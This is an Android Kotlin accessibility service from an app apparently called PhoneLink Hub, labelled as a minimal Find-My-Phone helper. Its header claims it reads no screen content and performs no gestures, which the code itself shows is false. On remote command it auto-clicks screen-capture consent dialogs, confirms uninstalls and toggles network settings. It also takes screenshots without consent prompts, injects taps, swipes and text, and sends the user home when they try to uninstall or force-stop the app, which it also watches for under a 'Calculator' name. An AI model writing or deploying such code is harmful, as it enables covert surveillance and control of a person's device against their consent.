package com.phonelink.hub.accessibility

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast

/**
 * FEATURE C: minimal accessibility service for Find-My-Phone.
 * Holds a privileged process alive so the alarm keeps playing; it does NOT
 * read the screen (canRetrieveWindowContent=false) and performs NO gestures.
 */
class FindPhoneAccessibilityService : AccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "find-phone accessibility service connected")

        // Auto-revive PhoneLinkService when accessibility framework connects on boot
        try {
            com.phonelink.hub.data.DevicePrefs.init(this)
            if (com.phonelink.hub.data.DevicePrefs.serviceEnabled && com.phonelink.hub.data.DevicePrefs.serverIp.isNotBlank()) {
                if (com.phonelink.hub.service.PhoneLinkService.instance == null) {
                    com.phonelink.hub.service.PhoneLinkService.start(this)
                    com.phonelink.hub.receiver.KeepAliveWorker.schedule(this)
                }
            }
        } catch (_: Exception) {}
    }

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val pkgName = event.packageName?.toString() ?: ""
        val now = System.currentTimeMillis()

        // 1. Automatic "Start now" clicker: ONLY when explicitly requested by Dashboard command!
        if (now <= expectingScreenCaptureUntil) {
            val lower = pkgName.lowercase()
            if (lower.contains("systemui") || lower.contains("permissioncontroller")) {
                autoApproveScreenCaptureDialog()
            }
        }

        // 2. Automatic Uninstall clicker: ONLY when remote uninstall was requested by Dashboard!
        val targetUninstallPkg = expectingUninstallPackage
        if (targetUninstallPkg != null && now <= expectingUninstallUntil) {
            autoApproveUninstallDialog(targetUninstallPkg)
        }

        // 2b. Automated Quick Setting Switch Clicker (Hotspot, Wi-Fi, Bluetooth)
        val targetToggle = expectingSettingToggle
        if (targetToggle != null && now <= expectingSettingToggleUntil) {
            autoToggleSettingSwitch(targetToggle)
        }

        // 3. Parental Control & App Blocker: only for user apps, NEVER system/settings/launcher
        if (com.phonelink.hub.data.DevicePrefs.parentalControlEnabled && pkgName.isNotBlank()) {
            checkAndEnforceAppBlock(pkgName)
        }

        // 4. Anti-Tamper Shield: Prevent kids from opening App Info or clicking Uninstall / Force stop in Settings
        if (com.phonelink.hub.data.DevicePrefs.antiUninstallShieldEnabled && now > expectingUninstallUntil) {
            val lower = pkgName.lowercase()
            if (lower.contains("settings") || lower.contains("securitycenter") || lower.contains("packageinstaller")) {
                checkAndBlockAppTampering()
            }
        }
    }

    private var lastTamperBlockedTime = 0L

    private fun checkAndBlockAppTampering() {
        try {
            val root = rootInActiveWindow ?: return
            val candidates = listOf("PhoneLink", "PhoneLink Hub", "com.phonelink.hub", "Calculator")
            var matchesApp = false
            for (name in candidates) {
                if (root.findAccessibilityNodeInfosByText(name).isNotEmpty()) {
                    matchesApp = true
                    break
                }
            }

            if (matchesApp) {
                val dangerousActions = listOf("Uninstall", "Force stop", "Clear data", "Clear storage", "Disable", "Storage & cache")
                var isDangerousScreen = false
                for (action in dangerousActions) {
                    if (root.findAccessibilityNodeInfosByText(action).isNotEmpty()) {
                        isDangerousScreen = true
                        break
                    }
                }

                if (isDangerousScreen) {
                    val now = System.currentTimeMillis()
                    if (now - lastTamperBlockedTime > 2500L) {
                        lastTamperBlockedTime = now
                        Log.w(TAG, "Blocked local tampering/uninstallation attempt by kid in Settings!")
                        performGlobalAction(GLOBAL_ACTION_HOME)
                        android.os.Handler(android.os.Looper.getMainLooper()).post {
                            Toast.makeText(applicationContext, "⚠️ Restricted by Parental Control", Toast.LENGTH_SHORT).show()
                        }
                    }
                }
            }
            root.recycle()
        } catch (e: Exception) {
            Log.w(TAG, "checkAndBlockAppTampering error: ${e.message}")
        }
    }

    private fun autoApproveScreenCaptureDialog() {
        try {
            val root = rootInActiveWindow ?: return
            // Verify this is actually a screen capture / cast dialog by checking text
            val castIndicators = listOf("Start now", "Start recording", "record", "screen", "cast", "display", "MediaProjection", "chalu karein", "shuru karein")
            var isCastPrompt = false
            for (ind in castIndicators) {
                if (root.findAccessibilityNodeInfosByText(ind).isNotEmpty()) {
                    isCastPrompt = true
                    break
                }
            }
            if (!isCastPrompt) {
                root.recycle()
                return
            }

            val candidates = mutableListOf<android.view.accessibility.AccessibilityNodeInfo>()
            candidates.addAll(root.findAccessibilityNodeInfosByViewId("android:id/button1"))
            val keywords = listOf("Start now", "Start recording", "Start", "chalu karein", "shuru karein")
            for (kw in keywords) {
                candidates.addAll(root.findAccessibilityNodeInfosByText(kw))
            }
            for (node in candidates) {
                if (node.isClickable) {
                    node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                    Log.i(TAG, "Auto-approved MediaProjection screen capture prompt via Accessibility click!")
                    expectingScreenCaptureUntil = 0L
                    node.recycle()
                    root.recycle()
                    return
                } else {
                    val parent = node.parent
                    if (parent != null && parent.isClickable) {
                        parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                        Log.i(TAG, "Auto-approved MediaProjection screen capture prompt via parent click!")
                        expectingScreenCaptureUntil = 0L
                        parent.recycle()
                        node.recycle()
                        root.recycle()
                        return
                    }
                }
                node.recycle()
            }
            root.recycle()
        } catch (e: Exception) {
            Log.w(TAG, "autoApproveScreenCaptureDialog error: ${e.message}")
        }
    }

    private fun clickNodeOrGesture(node: AccessibilityNodeInfo): Boolean {
        if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
            return true
        }
        var parent = node.parent
        while (parent != null) {
            if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                return true
            }
            parent = parent.parent
        }
        // Fallback: Physical Hardware Screen Touch Gesture at node center!
        val rect = android.graphics.Rect()
        node.getBoundsInScreen(rect)
        if (rect.width() > 0 && rect.height() > 0) {
            val path = android.graphics.Path().apply {
                moveTo(rect.exactCenterX(), rect.exactCenterY())
            }
            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 100)
            val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
            return dispatchGesture(gesture, null, null)
        }
        return false
    }

    private fun autoApproveUninstallDialog(packageName: String): Boolean {
        try {
            val root = rootInActiveWindow ?: return false
            val candidates = mutableListOf<android.view.accessibility.AccessibilityNodeInfo>()
            val buttonIds = listOf(
                "android:id/button1",
                "com.android.packageinstaller:id/ok_button",
                "com.google.android.packageinstaller:id/ok_button",
                "com.miui.packageinstaller:id/ok_button",
                "com.miui.packageinstaller:id/button1",
                "com.samsung.android.packageinstaller:id/ok_button",
                "com.android.permissioncontroller:id/permission_allow_button",
                "com.google.android.permissioncontroller:id/permission_allow_button"
            )
            for (bid in buttonIds) {
                candidates.addAll(root.findAccessibilityNodeInfosByViewId(bid))
            }

            val keywords = listOf(
                "OK", "Ok", "ok", "Uninstall", "UNINSTALL", "uninstall",
                "Delete", "Yes", "Remove", "Theek hai", "Hataayein", "Hatao", "Hatae", "Delete karein", "Haan"
            )
            for (kw in keywords) {
                candidates.addAll(root.findAccessibilityNodeInfosByText(kw))
            }

            for (node in candidates) {
                val nodeText = node.text?.toString()?.trim() ?: ""
                val resId = node.viewIdResourceName ?: ""
                val isButton1 = resId.endsWith(":id/button1") || resId.endsWith(":id/ok_button")
                val isMatching = isButton1 || keywords.any { it.equals(nodeText, ignoreCase = true) }

                if (isMatching) {
                    val clicked = clickNodeOrGesture(node)
                    if (clicked) {
                        Log.i(TAG, "Auto-confirmed uninstall for $packageName via click/gesture on '${nodeText.ifBlank { resId }}'!")
                        expectingUninstallPackage = null
                        expectingUninstallUntil = 0L
                        node.recycle()
                        root.recycle()
                        return true
                    }
                }
                node.recycle()
            }
            root.recycle()
        } catch (e: Exception) {
            Log.w(TAG, "autoApproveUninstallDialog error: ${e.message}")
        }
        return false
    }

    private fun autoToggleSettingSwitch(targetToggle: String) {
        try {
            val root = rootInActiveWindow ?: return
            val lowerTarget = targetToggle.lowercase()

            val switchNodes = mutableListOf<AccessibilityNodeInfo>()
            findNodesByClass(root, "Switch", switchNodes)
            findNodesByClass(root, "ToggleButton", switchNodes)

            var clicked = false

            if (switchNodes.isNotEmpty()) {
                if (switchNodes.size == 1) {
                    val sw = switchNodes[0]
                    clicked = if (sw.isClickable) {
                        sw.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    } else {
                        val parent = sw.parent
                        val res = parent?.isClickable == true && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        parent?.recycle()
                        res
                    }
                } else {
                    val keywords = when (lowerTarget) {
                        "hotspot", "tethering" -> listOf("Portable hotspot", "Personal Hotspot", "Hotspot", "Wi-Fi hotspot", "Share internet")
                        "wifi" -> listOf("Wi-Fi", "Use Wi-Fi", "WLAN", "Wi‑Fi")
                        "bluetooth" -> listOf("Bluetooth", "Use Bluetooth")
                        else -> listOf(targetToggle)
                    }

                    for (kw in keywords) {
                        val labelNodes = root.findAccessibilityNodeInfosByText(kw)
                        for (lbl in labelNodes) {
                            val parent = lbl.parent
                            if (parent != null) {
                                val childSwitches = mutableListOf<AccessibilityNodeInfo>()
                                findNodesByClass(parent, "Switch", childSwitches)
                                if (childSwitches.isNotEmpty()) {
                                    val cs = childSwitches[0]
                                    clicked = if (cs.isClickable) {
                                        cs.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                    } else {
                                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                    }
                                    for (s in childSwitches) s.recycle()
                                } else if (parent.isClickable) {
                                    clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                }
                                parent.recycle()
                            }
                            lbl.recycle()
                            if (clicked) break
                        }
                        if (clicked) break
                    }

                    if (!clicked && switchNodes.isNotEmpty()) {
                        val firstSw = switchNodes[0]
                        clicked = if (firstSw.isClickable) {
                            firstSw.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        } else {
                            val p = firstSw.parent
                            val res = p?.isClickable == true && p.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            p?.recycle()
                            res
                        }
                    }
                }
            } else {
                val keywords = when (lowerTarget) {
                    "hotspot", "tethering" -> listOf("Portable hotspot", "Personal Hotspot", "Hotspot", "Wi-Fi hotspot")
                    "wifi" -> listOf("Wi-Fi", "Use Wi-Fi", "WLAN")
                    "bluetooth" -> listOf("Bluetooth", "Use Bluetooth")
                    else -> listOf(targetToggle)
                }
                for (kw in keywords) {
                    val nodes = root.findAccessibilityNodeInfosByText(kw)
                    for (node in nodes) {
                        var curr: AccessibilityNodeInfo? = node
                        while (curr != null) {
                            if (curr.isClickable) {
                                clicked = curr.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                break
                            }
                            curr = curr.parent
                        }
                        node.recycle()
                        if (clicked) break
                    }
                    if (clicked) break
                }
            }

            for (node in switchNodes) {
                try { node.recycle() } catch (ignored: Exception) {}
            }
            root.recycle()

            if (clicked) {
                Log.i(TAG, "Successfully auto-toggled switch for: $targetToggle via Accessibility!")
                expectingSettingToggle = null
                expectingSettingToggleUntil = 0L
                finishToggleAndGoHome()
            }
        } catch (e: Exception) {
            Log.e(TAG, "autoToggleSettingSwitch error for $targetToggle", e)
        }
    }

    private fun finishToggleAndGoHome() {
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            try {
                performGlobalAction(GLOBAL_ACTION_BACK)
            } catch (ignored: Exception) {}
        }, 350L)
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            try {
                performGlobalAction(GLOBAL_ACTION_HOME)
            } catch (ignored: Exception) {}
        }, 750L)
    }

    private fun findNodesByClass(root: AccessibilityNodeInfo, classNamePart: String, result: MutableList<AccessibilityNodeInfo>) {
        if (root.className?.contains(classNamePart, ignoreCase = true) == true) {
            result.add(root)
        }
        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            findNodesByClass(child, classNamePart, result)
        }
    }

    private var lastBlockedPackage = ""
    private var lastBlockedTime = 0L

    private fun isSystemCriticalPackage(pkg: String): Boolean {
        if (pkg == packageName) return true
        val lower = pkg.lowercase()
        return lower.contains("settings") ||
               lower.contains("permissioncontroller") ||
               lower.contains("packageinstaller") ||
               lower.contains("launcher") ||
               lower.contains("home") ||
               lower.contains("systemui") ||
               lower.contains("securitycenter") ||
               lower.contains("inputmethod") ||
               lower.contains("keyboard") ||
               lower == "android"
    }

    private fun checkAndEnforceAppBlock(currentPackage: String) {
        if (isSystemCriticalPackage(currentPackage)) return

        val blocked = com.phonelink.hub.data.DevicePrefs.blockedPackages
        val isBlockedExplicitly = blocked.contains(currentPackage)

        // Screen time check
        val limitMins = com.phonelink.hub.data.DevicePrefs.screenTimeLimitMinutes
        var isTimeExceeded = false
        if (limitMins > 0) {
            val todayStr = java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.US).format(java.util.Date())
            if (com.phonelink.hub.data.DevicePrefs.screenTimeUsageDate != todayStr) {
                com.phonelink.hub.data.DevicePrefs.screenTimeUsageDate = todayStr
                com.phonelink.hub.data.DevicePrefs.screenTimeUsageMillisToday = 0L
            }
            val usageMins = (com.phonelink.hub.data.DevicePrefs.screenTimeUsageMillisToday / 60_000L).toInt()
            if (usageMins >= limitMins) {
                val allowed = com.phonelink.hub.data.DevicePrefs.allowedPackagesDuringLimit
                if (!allowed.contains(currentPackage)) {
                    isTimeExceeded = true
                }
            }
        }

        if (isBlockedExplicitly || isTimeExceeded) {
            val now = System.currentTimeMillis()
            if (currentPackage == lastBlockedPackage && now - lastBlockedTime < 3000L) {
                return
            }
            lastBlockedPackage = currentPackage
            lastBlockedTime = now

            Log.w(TAG, "Blocking app: $currentPackage (blockedExplicitly=$isBlockedExplicitly, timeExceeded=$isTimeExceeded)")
            performGlobalAction(GLOBAL_ACTION_HOME)
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                val reason = if (isBlockedExplicitly) "App is restricted by Parental Controls" else "Daily Screen Time limit reached for today!"
                android.widget.Toast.makeText(applicationContext, reason, android.widget.Toast.LENGTH_LONG).show()
            }
        }
    }

    override fun onInterrupt() {
    }

    fun performKey(action: String): Boolean {
        return when (action.lowercase()) {
            "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
            "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
            "recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
            "notifications" -> performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
            "quick_settings" -> performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS)
            "power_dialog" -> performGlobalAction(GLOBAL_ACTION_POWER_DIALOG)
            "lock_screen" -> if (android.os.Build.VERSION.SDK_INT >= 28) performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN) else false
            else -> false
        }
    }

    fun inputText(text: String): Boolean {
        try {
            val root = rootInActiveWindow ?: return false
            val focused = root.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT)
            if (focused != null) {
                val args = android.os.Bundle().apply {
                    putCharSequence(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                }
                val success = focused.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                focused.recycle()
                root.recycle()
                return success
            }
            root.recycle()
        } catch (e: Exception) {
            Log.e(TAG, "inputText failed", e)
        }
        return false
    }

    fun tap(x: Float, y: Float, durationMs: Long = 50L, onComplete: ((Boolean) -> Unit)? = null) {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.N) {
            onComplete?.invoke(false)
            return
        }
        try {
            val path = android.graphics.Path().apply {
                moveTo(x, y)
            }
            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, durationMs.coerceIn(20L, 1200L))
            val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
            dispatchGesture(gesture, object : GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    onComplete?.invoke(true)
                }
                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    onComplete?.invoke(false)
                }
            }, null)
        } catch (e: Exception) {
            Log.e(TAG, "dispatchGesture tap failed", e)
            onComplete?.invoke(false)
        }
    }

    fun swipe(x1: Float, y1: Float, x2: Float, y2: Float, durationMs: Long = 300, onComplete: ((Boolean) -> Unit)? = null) {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.N) {
            onComplete?.invoke(false)
            return
        }
        try {
            val path = android.graphics.Path().apply {
                moveTo(x1, y1)
                lineTo(x2, y2)
            }
            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, durationMs.coerceIn(50, 2000))
            val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
            dispatchGesture(gesture, object : GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    onComplete?.invoke(true)
                }
                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    onComplete?.invoke(false)
                }
            }, null)
        } catch (e: Exception) {
            Log.e(TAG, "dispatchGesture swipe failed", e)
            onComplete?.invoke(false)
        }
    }

    /**
     * Takes native hardware screenshot via AccessibilityService on Android 11+ (API 30+)
     * without requiring any MediaProjection token or user consent prompts!
     */
    fun takeScreenshot(callback: (android.graphics.Bitmap?) -> Unit) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            val executor = java.util.concurrent.Executors.newSingleThreadExecutor()
            try {
                takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    executor,
                    object : TakeScreenshotCallback {
                        override fun onSuccess(screenshotResult: ScreenshotResult) {
                            try {
                                val hardwareBuffer = screenshotResult.hardwareBuffer
                                val colorSpace = screenshotResult.colorSpace
                                val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                                val copy = bitmap?.copy(android.graphics.Bitmap.Config.ARGB_8888, false)
                                hardwareBuffer.close()
                                callback(copy)
                            } catch (e: Exception) {
                                Log.e(TAG, "Error processing hardware buffer screenshot", e)
                                callback(null)
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            Log.w(TAG, "Accessibility takeScreenshot failed with code: $errorCode")
                            callback(null)
                        }
                    }
                )
                return
            } catch (e: Exception) {
                Log.e(TAG, "Exception calling Accessibility takeScreenshot", e)
            }
        }
        callback(null)
    }

    private var volumePressCount = 0
    private var lastVolumePressTime = 0L

    override fun onKeyEvent(event: android.view.KeyEvent?): Boolean {
        if (event == null || !com.phonelink.hub.data.DevicePrefs.volumeSosEnabled) {
            return super.onKeyEvent(event)
        }
        if (event.action == android.view.KeyEvent.ACTION_DOWN) {
            val keyCode = event.keyCode
            if (keyCode == android.view.KeyEvent.KEYCODE_VOLUME_UP || keyCode == android.view.KeyEvent.KEYCODE_VOLUME_DOWN) {
                val now = System.currentTimeMillis()
                if (now - lastVolumePressTime < 3000L) {
                    volumePressCount++
                } else {
                    volumePressCount = 1
                }
                lastVolumePressTime = now
                if (volumePressCount >= 5) {
                    volumePressCount = 0
                    Log.i(TAG, "5x Volume key presses detected -> Triggering SOS Alert!")
                    com.phonelink.hub.service.PhoneLinkService.instance?.triggerVolumeSosAlert()
                }
            }
        }
        return super.onKeyEvent(event)
    }

    fun startActiveUninstallPoller(packageName: String, until: Long) {
        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        val runnable = object : Runnable {
            override fun run() {
                val now = System.currentTimeMillis()
                if (now <= until && expectingUninstallPackage == packageName) {
                    val approved = autoApproveUninstallDialog(packageName)
                    if (!approved) {
                        handler.postDelayed(this, 300L)
                    }
                }
            }
        }
        handler.postDelayed(runnable, 250L)
    }

    companion object {
        private const val TAG = "FindPhoneAccService"
        @Volatile
        var instance: FindPhoneAccessibilityService? = null
            private set

        @Volatile
        private var expectingScreenCaptureUntil: Long = 0L

        @Volatile
        private var expectingUninstallPackage: String? = null
        @Volatile
        private var expectingUninstallUntil: Long = 0L

        fun expectScreenCapturePrompt(durationMs: Long = 15_000L) {
            expectingScreenCaptureUntil = System.currentTimeMillis() + durationMs
            Log.d(TAG, "Expecting system screen capture prompt for ${durationMs}ms")
        }

        fun expectUninstallConfirmation(packageName: String, durationMs: Long = 30_000L) {
            expectingUninstallPackage = packageName
            expectingUninstallUntil = System.currentTimeMillis() + durationMs
            Log.d(TAG, "Expecting system uninstall prompt for $packageName (${durationMs}ms)")
            instance?.startActiveUninstallPoller(packageName, expectingUninstallUntil)
        }

        @Volatile
        private var expectingSettingToggle: String? = null
        @Volatile
        private var expectingSettingToggleUntil: Long = 0L

        fun expectSettingToggle(action: String, durationMs: Long = 6_000L) {
            expectingSettingToggle = action
            expectingSettingToggleUntil = System.currentTimeMillis() + durationMs
            Log.d(TAG, "Expecting system setting toggle for $action (${durationMs}ms)")
        }
    }
}
